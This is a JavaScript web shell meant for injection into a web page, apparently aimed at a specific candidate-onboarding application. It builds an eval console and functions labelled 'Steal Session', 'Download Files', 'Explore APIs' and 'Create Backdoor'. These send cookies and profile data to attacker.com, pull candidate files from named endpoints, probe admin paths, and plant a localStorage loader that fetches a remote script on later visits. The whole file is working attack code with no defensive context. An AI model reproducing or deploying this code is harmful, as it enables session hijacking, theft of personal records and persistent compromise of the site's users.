// Advanced JavaScript Web Shell
(function() {
    // Create advanced interface
    const shell = document.createElement('div');
    shell.style.cssText = 'position:fixed;top:20px;left:20px;width:500px;background:#111;color:#0f0;z-index:99999;padding:15px;font-family:monospace;border:2px solid #0f0;';
    shell.innerHTML = `
        <h3>🔐 Advanced Web Shell - ${document.domain}</h3>
        <div>
            <input type="text" id="cmd" placeholder="JavaScript command" style="width:70%;background:#222;color:#0f0;border:1px solid #0f0;">
            <button onclick="runCmd()" style="background:#0f0;color:black;border:none;padding:5px;">Run</button>
            <button onclick="clearOutput()" style="background:red;color:white;border:none;padding:5px;">Clear</button>
        </div>
        <div style="margin:10px 0;">
            <button onclick="stealSession()">Steal Session</button>
            <button onclick="downloadFiles()">Download Files</button>
            <button onclick="exploreEndpoints()">Explore APIs</button>
            <button onclick="createBackdoor()">Create Backdoor</button>
        </div>
        <div id="output" style="height:300px;overflow:auto;background:black;border:1px solid #333;padding:10px;margin:5px 0;"></div>
    `;
    document.body.appendChild(shell);

    const output = document.getElementById('output');

    function log(msg) {
        output.innerHTML += msg + '\n';
        output.scrollTop = output.scrollHeight;
    }

    window.runCmd = function() {
        const cmd = document.getElementById('cmd').value;
        log(`> ${cmd}`);
        try {
            const result = eval(cmd);
            log(`< ${result}`);
        } catch(e) {
            log(`! Error: ${e}`);
        }
    };

    window.clearOutput = function() {
        output.innerHTML = '';
    };

    window.stealSession = function() {
        log('Stealing session data...');
        const data = {
            cookies: document.cookie,
            localStorage: Object.keys(localStorage),
            sessionStorage: Object.keys(sessionStorage),
            user: 'Extracting...'
        };
        
        // Try to get user profile
        fetch('/Account/ViewProfile', {credentials: 'include'})
            .then(r => r.text())
            .then(profile => {
                data.profile = profile.substring(0, 500) + '...';
                log('Session stolen: ' + JSON.stringify(data, null, 2));
                
                // Exfiltrate
                fetch('https://attacker.com/exfil', {
                    method: 'POST',
                    body: JSON.stringify(data)
                });
            });
    };

    window.downloadFiles = function() {
        log('Attempting to download files...');
        
        // Try to download via known endpoints
        const fileEndpoints = [
            '/ManageCandidates/OBTCandidatesOnboarding/DownloadFile?key=418CD908-1B23-495F-B5EC-2C5D7126E9B5',
            '/ManageCandidates/OBTCandidatesOnboarding/DownloadAllFiles'
        ];
        
        fileEndpoints.forEach(endpoint => {
            fetch(endpoint, {credentials: 'include'})
                .then(r => {
                    if (r.status === 200) {
                        log(`✅ Can access: ${endpoint}`);
                        return r.blob();
                    }
                })
                .then(blob => {
                    if (blob) {
                        log(`Downloaded file: ${blob.size} bytes`);
                        // Could upload to attacker server
                    }
                });
        });
    };

    window.exploreEndpoints = function() {
        log('Exploring API endpoints...');
        
        const endpoints = [
            '/Account/ViewProfile',
            '/ManageDashboards/Notification/GetNotification',
            '/ManageDashboards/Notification/GetCount',
            '/ManageCandidates/OBTCandidatesOnboarding/',
            '/Admin/',
            '/api/Users'
        ];
        
        endpoints.forEach(endpoint => {
            fetch(endpoint, {credentials: 'include'})
                .then(r => {
                    log(`${endpoint}: ${r.status}`);
                });
        });
    };

    window.createBackdoor = function() {
        log('Creating persistent backdoor...');
        
        // Store backdoor in localStorage
        localStorage.setItem('webShellBackdoor', `
            if (!window._ws) {
                var s = document.createElement('script');
                s.src = 'https://attacker.com/webshell.js';
                document.head.appendChild(s);
                window._ws = true;
            }
        `);
        
        // Create auto-load on page visit
        const backdoorScript = document.createElement('script');
        backdoorScript.textContent = `
            if (localStorage.getItem('webShellBackdoor')) {
                eval(localStorage.getItem('webShellBackdoor'));
            }
        `;
        document.head.appendChild(backdoorScript);
        
        log('Backdoor installed in localStorage');
    };

    log('🟢 Advanced Web Shell Ready');
    log('Domain: ' + document.domain);
    log('Cookies: ' + document.cookie);
})();
